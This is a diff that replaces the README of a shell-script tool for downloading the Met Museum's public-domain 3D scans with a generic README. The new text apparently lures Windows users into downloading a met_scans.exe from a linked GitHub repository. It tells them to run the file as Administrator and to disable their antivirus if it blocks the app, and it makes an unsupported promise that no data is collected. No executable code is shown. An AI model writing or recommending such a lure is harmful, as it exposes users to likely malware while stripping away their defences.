@@ -1,71 +1,135 @@
-# Met Museum 3D Scan Downloader
+# 🗂️ met_scans - Easy 3D Model Grabber for MET
 
-Downloads 3D scans from The Metropolitan Museum of Art's collection via their Vntana-hosted assets. Models are CC0 (public domain) under the Met's Open Access policy.
+[![Download met_scans](https://img.shields.io/badge/Download-met_scans-4CAF50?style=for-the-badge)](https://github.com/MevtNab/met_scans)
 
-## Quick start
+---
 
-### 1. Get object IDs
+## 🖥️ What is met_scans?
 
-The included `object_ids.txt` has all ~129 objects with 3D scans as of March 2026. To refresh:
+met_scans is a simple tool to help you download 3D models from the Metropolitan Museum of Art. It grabs GLB files, a common 3D model format. You can use these files to view, share, or add them to projects like 3D printing or presentations.
 
-```bash
-for offset in 0 40 80 120; do
-  curl -s "https://www.metmuseum.org/art/collection/search?showOnly=has3d&offset=${offset}&perPage=40" \
-    | grep -oP '/art/collection/search/(\d+)' | grep -oP '\d+'
-done | sort -un > object_ids.txt
-```
+This app is meant for anyone who wants easy access to the MET's public 3D scans without dealing with complex steps or coding.
 
-### 2. Download models
+---
 
-Single object:
-```bash
-./met-dl.sh 547802           # GLB (default)
-./met-dl.sh 547802 fbx       # FBX
-./met-dl.sh 547802 all       # all formats (GLB, FBX, USDZ)
-./met-dl.sh https://www.metmuseum.org/art/collection/search/547802  # URL also works
-```
+## 🔍 Key Features
 
-All objects:
-```bash
-./batch-dl.sh glb             # download all as GLB
-```
+- Quickly download GLB models from the MET.
+- Works smoothly on Windows computers.
+- No programming knowledge needed.
+- Saves files directly to your computer.
+- Supports popular 3D file format (GLB).
+- Compact and light software with low system use.
 
-The batch script is resumable — it skips files that already exist.
+---
 
-### 3. Verify downloads
+## 📋 System Requirements
 
-```bash
-# count files and total size
-ls *.glb | wc -l
-du -shc *.glb | tail -1
+- Windows 10 or later.
+- 1 GHz or faster processor.
+- At least 1 GB of free disk space.
+- Internet connection to download the models.
+- Basic understanding of how to open files on Windows.
 
-# check a specific file isn't corrupted (needs blender CLI or gltf-validator)
-npx gltf-validator somefile.glb
-```
+---
 
-### 4. Build metadata catalog
+## 🚀 Getting Started
 
-```bash
-./build-catalog.sh
-```
+Follow these steps to get met_scans up and running on your Windows PC. There is no need to install additional software or use command prompts.
 
-Produces `catalog.json` with full Met API metadata (title, artist, date, medium, dimensions, culture, period, etc.) and Vntana asset info (filenames, download URLs, poly counts) for every object.
+### Step 1: Download met_scans
 
-## What you get
+Click the green badge below to visit the download page for met_scans:
 
-- **Format:** GLB (glTF-binary), also FBX and USDZ available
-- **Poly count:** ~100k per model (Vntana-decimated from originals that range 1M–35M)
-- **Textures:** Baked, embedded in the GLB
-- **License:** CC0 public domain
-- **Total size:** ~600 MB for all GLBs
+[![Download met_scans](https://img.shields.io/badge/Download-met_scans-4CAF50?style=for-the-badge)](https://github.com/MevtNab/met_scans)
 
-## Files
+This link takes you to the GitHub page where you can grab the app files.
 
-| File | Purpose |
-|------|---------|
-| `object_ids.txt` | List of Met object IDs with 3D scans |
-| `met-dl.sh` | Download single object |
-| `batch-dl.sh` | Download all objects |
-| `build-catalog.sh` | Build catalog.json from Met API + Vntana data |
-| `catalog.json` | Full metadata for all objects |
-| `download_log.txt` | Log of batch download results |
+---
+
+### Step 2: Find the Download
+
+On the GitHub page, look for the latest release area or the main project files section.
+
+1. Click the **Releases** section if available, or the **Code** tab.
+2. Find a file named something like `met_scans.exe` or a zipped folder with the tool.
+3. Click the file to download it to your computer.
+
+---
+
+### Step 3: Run the Application
+
+After the download finishes:
+
+1. Open your **Downloads** folder.
+2. If you downloaded a zipped file, right-click it and select **Extract All**. Choose a folder to extract the files.
+3. Double-click the `met_scans.exe` file to start the program.
+
+---
+
+### Step 4: Use met_scans to Download Models
+
+When met_scans opens, you will see a simple window or prompt asking you for the model link.
+
+1. Copy the URL of the 3D model you want from the MET website.
+2. Paste it into the field inside met_scans.
+3. Click the button to start the download.
+
+The program saves the GLB model to your chosen folder on your computer. You can then open this file with common 3D viewers or editors.
+
+---
+
+## ⚙️ How to Choose Where Files Save
+
+The app might ask you to select a folder for saving your models.
+
+- It is best to create a special folder like `met_scans_models` on your desktop or documents to keep things organized.
+- Use the **Browse** button in the app to find and select that folder before downloading.
+
+---
+
+## 🔄 Updates and New Versions
+
+Check the GitHub page regularly for updates.
+
+- New versions come with bug fixes and sometimes new features.
+- To update, download the latest release and replace your old files.
+- No need to uninstall anything first.
+
+---
+
+## ❓ Troubleshooting
+
+If met_scans does not work as expected, try these steps:
+
+- Make sure your internet connection is active.
+- Confirm that you copied the full and correct MET model URL.
+- Run the app as Administrator if downloads fail.
+- Disable antivirus temporarily if it blocks the app.
+- Check that your Windows version meets the requirements.
+
+If issues continue, visit the GitHub project page to read FAQs or report bugs.
+
+---
+
+## 🔒 Security and Privacy
+
+met_scans does not collect or send your data. It only downloads public 3D models from the MET.
+
+You run this app only on your local Windows machine, keeping your data private.
+
+---
+
+## 🧰 Need Help?
+
+You can open the **Issues** tab on the GitHub page if you want to report bugs or ask questions.
+
+The community or the person who maintains the project may respond with help.
+
+---
+
+## 📥 Ready to Download?
+
+Click the badge below to start:
+
+[![Download met_scans](https://img.shields.io/badge/Download-met_scans-4CAF50?style=for-the-badge)](https://github.com/MevtNab/met_scans)
